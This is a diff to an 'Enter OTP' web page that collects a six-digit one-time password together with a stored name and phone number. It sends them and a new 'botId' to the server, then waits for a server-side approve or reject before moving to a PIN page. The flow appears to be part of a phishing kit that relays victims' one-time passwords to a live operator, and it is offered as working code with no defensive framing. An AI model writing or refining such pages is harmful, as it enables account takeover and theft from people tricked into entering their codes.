@@ -15,7 +15,6 @@
     align-items: center;
     justify-content: center;
   }
-
   .card {
     background: #ffffff;
     width: 92%;
@@ -25,7 +24,6 @@
     box-shadow: 0 10px 30px rgba(0,0,0,0.15);
     position: relative;
   }
-
   .close {
     position: absolute;
     top: 14px;
@@ -41,74 +39,23 @@
     font-weight: bold;
     cursor: pointer;
   }
-
-  h1 {
-    text-align: center;
-    font-size: 22px;
-    margin-bottom: 6px;
-  }
-
-  .info {
-    text-align: center;
-    font-size: 14px;
-    color: #666;
-    margin-bottom: 24px;
-  }
-
-  .otp-wrap {
-    display: flex;
-    justify-content: space-between;
-    gap: 8px;
-    margin-bottom: 18px;
-  }
-
+  h1 { text-align: center; font-size: 22px; margin-bottom: 6px; }
+  .info { text-align: center; font-size: 14px; color: #666; margin-bottom: 24px; }
+  .otp-wrap { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 18px; }
   .otp-wrap input {
-    width: 48px;
-    height: 54px;
-    text-align: center;
-    font-size: 22px;
-    border-radius: 8px;
-    border: 1.5px solid #ddd;
-    outline: none;
+    width: 48px; height: 54px; text-align: center; font-size: 22px;
+    border-radius: 8px; border: 1.5px solid #ddd; outline: none;
   }
-
-  .otp-wrap input:focus {
-    border-color: #e11b22;
-  }
-
-  .timer {
-    text-align: center;
-    font-size: 13px;
-    color: #777;
-    margin-bottom: 20px;
-  }
-
+  .otp-wrap input:focus { border-color: #e11b22; }
+  .timer { text-align: center; font-size: 13px; color: #777; margin-bottom: 20px; }
   button {
-    width: 100%;
-    padding: 16px;
-    font-size: 16px;
-    background: #e11b22;
-    color: #fff;
-    border: none;
-    border-radius: 999px;
-    opacity: 0.5;
+    width: 100%; padding: 16px; font-size: 16px;
+    background: #e11b22; color: #fff; border: none;
+    border-radius: 999px; opacity: 0.5;
   }
-
-  button:enabled {
-    opacity: 1;
-  }
-
-  .resend {
-    text-align: center;
-    font-size: 14px;
-    color: #999;
-    margin-top: 18px;
-  }
-
-  .resend.active {
-    color: #e11b22;
-    cursor: pointer;
-  }
+  button:enabled { opacity: 1; }
+  .resend { text-align: center; font-size: 14px; color: #999; margin-top: 18px; }
+  .resend.active { color: #e11b22; cursor: pointer; }
 </style>
 </head>
 
@@ -118,9 +65,7 @@
   <div class="close">✕</div>
 
   <h1>Enter OTP</h1>
-  <div class="info">
-    Please enter the OTP sent to verify your number
-  </div>
+  <div class="info">Please enter the OTP sent to verify your number</div>
 
   <div class="otp-wrap">
     <input type="tel" maxlength="1" inputmode="numeric">
@@ -136,7 +81,6 @@
   </div>
 
   <button id="verifyBtn" disabled>Verify OTP</button>
-
   <div id="resend" class="resend">Resend in 02:00</div>
 </div>
 
@@ -148,26 +92,22 @@
 
   const fullName = localStorage.getItem('fullName');
   const phone = localStorage.getItem('phone');
+  const botId = localStorage.getItem('botId');
 
-  if (!fullName || !phone) {
+  if (!fullName || !phone || !botId) {
     alert('Session expired. Please start again.');
     window.location.href = 'index.html';
   }
 
-  // ===== COUNTDOWN (120 SECONDS) =====
   let timeLeft = 120;
-
   function formatTime(sec) {
-    const m = String(Math.floor(sec / 60)).padStart(2, '0');
-    const s = String(sec % 60).padStart(2, '0');
-    return `${m}:${s}`;
+    return `${String(Math.floor(sec/60)).padStart(2,'0')}:${String(sec%60).padStart(2,'0')}`;
   }
 
   const timer = setInterval(() => {
     timeLeft--;
     countdownEl.textContent = timeLeft;
     resendEl.textContent = `Resend in ${formatTime(timeLeft)}`;
-
     if (timeLeft <= 0) {
       clearInterval(timer);
       countdownEl.textContent = '0';
@@ -176,95 +116,54 @@
     }
   }, 1000);
 
-  // ===== SUBMIT OTP (MANUAL) =====
-  async function submitOtp(code) {
-    try {
-      const res = await fetch(`${window.location.origin}/submit-otp`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          name: fullName,
-          phone,
-          otp: code
-        })
-      });
-
-      const { requestId } = await res.json();
-      pollApproval(requestId);
-
-    } catch {
-      alert('Server error. Please try again.');
-    }
+  function submitOtp(code) {
+    fetch(`${window.location.origin}/submit-otp`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        name: fullName,
+        phone,
+        otp: code,
+        botId
+      })
+    })
+    .then(r => r.json())
+    .then(({ requestId }) => pollApproval(requestId))
+    .catch(() => alert('Server error. Try again.'));
   }
 
   function pollApproval(requestId) {
     const interval = setInterval(async () => {
-      const res = await fetch(
-        `${window.location.origin}/check-otp/${requestId}`
-      );
-      const data = await res.json();
-
-      if (data.approved === true) {
+      const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
+      const d = await r.json();
+      if (d.approved === true) {
         clearInterval(interval);
         window.location.href = 'pin.html';
       }
-
-      if (data.approved === false) {
+      if (d.approved === false) {
         clearInterval(interval);
-        alert('OTP rejected. Please try again.');
+        alert('OTP rejected.');
         window.location.reload();
       }
     }, 2000);
   }
 
-  // ===== ENABLE BUTTON ONLY =====
   function checkInputs() {
-    const code = Array.from(inputs).map(i => i.value).join('');
-    verifyBtn.disabled = code.length !== 6;
+    verifyBtn.disabled = Array.from(inputs).map(i=>i.value).join('').length !== 6;
   }
 
-  inputs.forEach((input, index) => {
+  inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
-      input.value = input.value.replace(/\D/g, '');
-      if (input.value && inputs[index + 1]) {
-        inputs[index + 1].focus();
-      }
+      input.value = input.value.replace(/\D/g,'');
+      if (input.value && inputs[i+1]) inputs[i+1].focus();
       checkInputs();
     });
-
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !input.value && inputs[index - 1]) {
-        inputs[index - 1].focus();
-      }
-    });
   });
 
-  // ===== BUTTON CLICK (ONLY SUBMIT POINT) =====
   verifyBtn.addEventListener('click', () => {
-    const code = Array.from(inputs).map(i => i.value).join('');
-    if (code.length === 6) {
-      submitOtp(code);
-    }
+    const code = Array.from(inputs).map(i=>i.value).join('');
+    if (code.length === 6) submitOtp(code);
   });
-
-  // ===== AUTO-PASTE OTP (FILL ONLY, NO SUBMIT) =====
-  if ('OTPCredential' in window) {
-    window.addEventListener('DOMContentLoaded', async () => {
-      try {
-        const otp = await navigator.credentials.get({
-          otp: { transport: ['sms'] },
-          signal: new AbortController().signal
-        });
-
-        if (otp && otp.code) {
-          otp.code.split('').forEach((digit, i) => {
-            if (inputs[i]) inputs[i].value = digit;
-          });
-          checkInputs();
-        }
-      } catch {}
-    });
-  }
 </script>
 
 </body>
